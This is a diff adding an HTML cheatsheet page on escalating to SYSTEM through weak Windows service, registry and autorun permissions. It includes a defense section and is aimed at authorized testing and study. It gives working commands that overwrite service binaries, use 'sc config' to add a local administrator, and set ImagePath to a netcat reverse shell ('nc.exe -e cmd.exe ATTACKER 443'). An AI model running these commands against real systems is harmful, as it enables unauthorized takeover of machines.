@@ -1,0 +1,96 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Weak Service &amp; Registry Permissions · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>Weak Service &amp; Registry Permissions</h1><p class="cx-lede">Escalating to SYSTEM through misconfigured ACLs - a modifiable service binary you can overwrite, a service whose configuration you can rewrite (sc config binPath), a writable services registry key (ImagePath), unquoted service paths, and modifiable autorun entries. Enumerate with SharpUp/PowerUp/winPEAS/accesschk, then turn a weak permission into a SYSTEM shell or a new local admin.</p><div class="cx-tags"><span class="cx-tag">MITRE T1543.003, T1574, T1068</span><span class="cx-tag">D3FEND D3-FA</span><span class="cx-tag">IMPACT PrivEsc, SystemCompromise</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Most Windows services run as <code>NT AUTHORITY\SYSTEM</code>. If an unprivileged user can modify what a service <em>runs</em> - its binary on disk, its configuration, or its registry key - starting (or waiting for) that service runs attacker code as SYSTEM. These flaws are rare in large-vendor software but common in third-party, open-source, and in-house applications.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Enumerate candidates
+.\SharpUp.exe audit                                   # GhostPack: modifiable binaries/services
+powershell -ep bypass; . .\PowerUp.ps1; Invoke-AllChecks
+.\winPEASx64.exe quiet servicesinfo
+
+# 1. Weak file ACL on the binary → overwrite it
+icacls &quot;C:\Program Files\Vuln\service.exe&quot;            # look for BUILTIN\Users / Everyone :(F)
+copy /Y evil.exe &quot;C:\Program Files\Vuln\service.exe&quot; &amp; sc start VulnSvc
+
+# 2. Weak service config ACL → rewrite binPath
+accesschk.exe /accepteula -quvcw VulnSvc              # SERVICE_ALL_ACCESS for Authenticated Users?
+sc config VulnSvc binpath= &quot;cmd /c net localgroup administrators pwn /add&quot;
+sc stop VulnSvc &amp; sc start VulnSvc
+
+# 3. Writable services registry key → rewrite ImagePath
+accesschk.exe /accepteula &quot;user&quot; -kvuqsw hklm\System\CurrentControlSet\services
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc -Name ImagePath -Value &quot;C:\temp\nc.exe -e cmd.exe ATTACKER 443&quot;</code></pre></figure>
+<p>Success indicator: the service's next start runs your command as SYSTEM - a new local admin appears in <code>net localgroup administrators</code>, or a reverse shell returns <code>nt authority\system</code>.</p>
+<h2 id="enumerate-the-weakness">Enumerate the weakness</h2>
+<p>Automated scanners find these fastest; each flags a slightly different subset, so run more than one when a target is quiet:</p>
+<ul>
+<li><strong>SharpUp</strong> (<code>audit</code>) - <code>Modifiable Services</code> (config ACL) and <code>Modifiable Service Binaries</code> (file ACL).</li>
+<li><strong>PowerUp.ps1</strong> (<code>Invoke-AllChecks</code>) - the PowerShell equivalent; also finds unquoted paths and <code>AlwaysInstallElevated</code>.</li>
+<li><strong>winPEAS</strong> (<code>servicesinfo</code>) - broad, noisy, colour-coded.</li>
+<li><strong>accesschk.exe</strong> (Sysinternals) - the manual verifier for a specific service or the whole services registry tree.</li>
+</ul>
+<p>Then confirm by hand before acting - the exploit path differs by <em>which</em> permission is weak.</p>
+<h2 id="1-modifiable-service-binary-weak-file-acl">1. Modifiable service binary (weak file ACL)</h2>
+<p>The service's executable is writable by your user. Verify with <code>icacls</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>icacls &quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;
+# BUILTIN\Users:(I)(F)   Everyone:(I)(F)   ← full control for unprivileged users</code></pre></figure>
+<p>Back up the original, drop a payload (msfvenom reverse shell, or a local-admin-adding stub) in its place, and (re)start the service:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>copy &quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot; C:\temp\svc.bak
+copy /Y evil.exe &quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;
+sc start SecurityService</code></pre></figure>
+<p>If the service is <code>StartMode: Auto</code> but already running, you need restart rights (next section) or a reboot. <strong>Restore the original binary afterward</strong> so the service keeps working.</p>
+<h2 id="2-weak-service-configuration-modifiable-service-sc-config">2. Weak service configuration (modifiable service, <code>sc config</code>)</h2>
+<p>Here the <em>service object</em> grants you write access even though the binary is protected. <code>accesschk</code> shows the ACL; <code>SERVICE_ALL_ACCESS</code> (or <code>SERVICE_CHANGE_CONFIG</code> + <code>SERVICE_START</code>/<code>SERVICE_STOP</code>) for a group you're in is the win:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>accesschk.exe /accepteula -quvcw WindscribeService
+#  RW NT AUTHORITY\Authenticated Users  SERVICE_ALL_ACCESS   ← full control</code></pre></figure>
+<p>Flags: <code>-q</code> no banner, <code>-u</code> suppress errors, <code>-v</code> verbose, <code>-c</code> a service name, <code>-w</code> write access only.</p>
+<p>Rewrite the binary path to any command, then cycle the service. The command runs as the service account even though the "service" fails to start (the binary isn't a real service - Windows runs it, it errors, the side effect already happened):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>sc config WindscribeService binpath= &quot;cmd /c net localgroup administrators student /add&quot;
+sc stop WindscribeService
+sc start WindscribeService          # returns error 1053 - the net command still ran</code></pre></figure>
+<p>Note the space after <code>binpath=</code> - <code>sc</code> requires it. The Update Orchestrator Service (<code>UsoSvc</code>), which runs as SYSTEM and can't be removed, was exploitable this exact way before the patch for <strong>CVE-2019-1322</strong>.</p>
+<p><strong>Cleanup:</strong> restore the original <code>binPath</code> and restart so the service works:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>sc config WindscribeService binpath= &quot;\&quot;C:\Program Files (x86)\Windscribe\WindscribeService.exe\&quot;&quot;
+sc start WindscribeService</code></pre></figure>
+<p>The inner escaped quotes matter: <code>sc</code>'s own parsing strips the outer pair, so <code>binpath= "C:\Program Files...\x.exe"</code> stores the path <strong>unquoted</strong> - restoring it that way reintroduces an unquoted-service-path weakness (see below) instead of fixing the service. Escape the quotes (<code>\"..\"</code>) so they're literally stored in <code>ImagePath</code>.</p>
+<h2 id="3-permissive-registry-acl-imagepath">3. Permissive registry ACL (<code>ImagePath</code>)</h2>
+<p>Service definitions live under <code>HKLM\System\CurrentControlSet\services\&lt;name&gt;</code>; the <code>ImagePath</code> value is the binary that runs. A writable key is equivalent to a writable service config. Find them with <code>accesschk</code> (<code>-k</code> registry, <code>-s</code> recurse):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>accesschk.exe /accepteula &quot;user&quot; -kvuqsw hklm\System\CurrentControlSet\services
+#  RW HKLM\System\CurrentControlSet\services\VulnSvc   KEY_ALL_ACCESS</code></pre></figure>
+<p>Overwrite <code>ImagePath</code>, then start the service:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc -Name &quot;ImagePath&quot; `
+  -Value &quot;C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443&quot;</code></pre></figure>
+<h2 id="4-unquoted-service-path">4. Unquoted service path</h2>
+<p>When a service's <code>BINARY_PATH_NAME</code> contains spaces and is <strong>not</strong> quoted, Windows tries each space-delimited prefix (with <code>.exe</code> implied) in order:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>sc qc SystemExplorerHelpService
+#  BINARY_PATH_NAME : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+# Windows tries, in order:
+#   C:\Program.exe
+#   C:\Program Files (x86)\System.exe
+#   C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code></pre></figure>
+<p>Plant an executable at one of the earlier names and it runs as the service account. Find them with:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>wmic service get name,displayname,pathname,startmode | findstr /i &quot;auto&quot; | findstr /i /v &quot;c:\windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></pre></figure>
+<p>In practice this is <strong>often found but rarely exploitable</strong> - writing to <code>C:\</code> or <code>C:\Program Files\</code> needs admin rights, and even where it's writable you usually can't restart the service without a reboot. Treat it as low-probability unless the writable prefix sits in a directory you control.</p>
+<h2 id="5-modifiable-autorun-binary">5. Modifiable autorun binary</h2>
+<p>Programs set to run at logon/boot are another path - if you can overwrite a listed binary or write to its <code>Run</code> key, you execute as whoever logs in next (an admin, ideally):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</code></pre></figure>
+<p>Check write access to each listed <code>command</code> and to the backing <code>HKLM\...\CurrentVersion\Run</code> keys. This is slower-yielding than the service paths above (it waits on a logon) but is a reliable persistence-plus-escalation primitive when a privileged user logs in regularly.</p>
+<h2 id="defense">Defense</h2>
+<ul>
+<li>Service binaries and their directories should be writable only by <code>Administrators</code>/<code>SYSTEM</code>; audit third-party installers, which frequently loosen these ACLs.</li>
+<li>Lock down service object permissions - unprivileged groups should never hold <code>SERVICE_CHANGE_CONFIG</code> or write to a service's registry key.</li>
+<li><strong>Always quote service binary paths.</strong> Installers should wrap <code>BINARY_PATH_NAME</code> in quotes.</li>
+<li>Run services with the least privilege they need (a virtual/service account, gMSA) rather than <code>LocalSystem</code>, so a hijack yields less.</li>
+<li>Baseline autorun entries and alert on changes to <code>Run</code> keys and startup folders.</li>
+</ul>
+<h2 id="related">Related</h2>
+<ul>
+<li><a href="../initial-enumeration/index.html">Initial enumeration</a> - finding services, patch level, and installed software first</li>
+<li><a href="../vulnerable-services/index.html">Vulnerable services</a> - exploiting <em>known-vulnerable</em> third-party services rather than ACL flaws</li>
+<li><a href="../dll-hijacking/index.html">DLL hijacking</a> - a related "service loads attacker code" path through the DLL search order</li>
+<li><a href="../seimpersonate/index.html">SeImpersonate</a> - if the weak service runs as a service account with impersonation rights, that's an alternate route to SYSTEM</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../other-privileged-groups/index.html">Previous: Other Privileged Groups</a><a class="cx-next" href="../vulnerable-services/index.html">Next: Vulnerable Services</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
